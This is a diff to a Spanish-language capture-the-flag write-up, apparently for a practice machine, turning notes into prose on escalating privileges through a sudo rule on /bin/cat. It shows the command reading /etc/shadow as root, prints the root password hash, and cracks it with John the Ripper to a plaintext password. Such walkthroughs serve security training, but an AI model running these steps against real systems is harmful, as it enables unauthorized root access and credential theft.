@@ -51,14 +51,17 @@ Primero obtenemos la `User Flag`:
 
 Apenas tenemos **Footholding del Sistema**, una de las primeras cosas para _Elevar Privilegios_ es buscar **Privilegios Sudo**. Lo chequeamos con `sudo -l`:
 
+* (root) NOPASSWD: /bin/cat
 
-(root) NOPASSWD: /bin/cat
-FO Bins
-            * `sudo -u root /bin/cat /etc/shadow`
-                * `root:$6$zdk0.jUm$Vya24cGzM1duJkwM5b17Q205xDJ47LOAg/OpZvJ1gKbLF8PJBdKJA4a6M.JYPUTAaWu4infDjI88U9yUXEVgL.`
-                * IA ==> SHA512
-                * nano shadow.txt
-                    * `root:$6$zdk0.jUm$Vya24cGzM1duJkwM5b17Q205xDJ47LOAg/OpZvJ1gKbLF8PJBdKJA4a6M.JYPUTAaWu4infDjI88U9yUXEVgL.:18490:0:99999:7:::`
+Esto nos permitiría poder leer ficheros como root. Por lo cual, vamos a verificarsi enemos una posible _Explotación Sudo_. Vamos a [GTFOBins](https://gtfobins.github.io/) y terminamos corriendo: `sudo -u root /bin/cat /etc/shadow`.
+
+Nos devuelve el contenido de /etc/shadow y vemos la línea que nos importa:
+
+> `root:$6$zdk0.jUm$Vya24cGzM1duJkwM5b17Q205xDJ47LOAg/OpZvJ1gKbLF8PJBdKJA4a6M.JYPUTAaWu4infDjI88U9yUXEVgL.`
+
+Consultando a la IA, por ejemplo nos damos cuenta que trata de un hash _SHA512_, por lo cual tendremos que usar nuevamente John the Ripper para resolver. Creamos un fichero que contenga toda la línea correspondiente a root con: `nano shadow.txt`
+
+`root:$6$zdk0.jUm$Vya24cGzM1duJkwM5b17Q205xDJ47LOAg/OpZvJ1gKbLF8PJBdKJA4a6M.JYPUTAaWu4infDjI88U9yUXEVgL.:18490:0:99999:7:::`
                 * `john -wordlist=[rockyou.txt] shadow.txt`
                     * `root:football`
                     * (john --show shadow.txt)
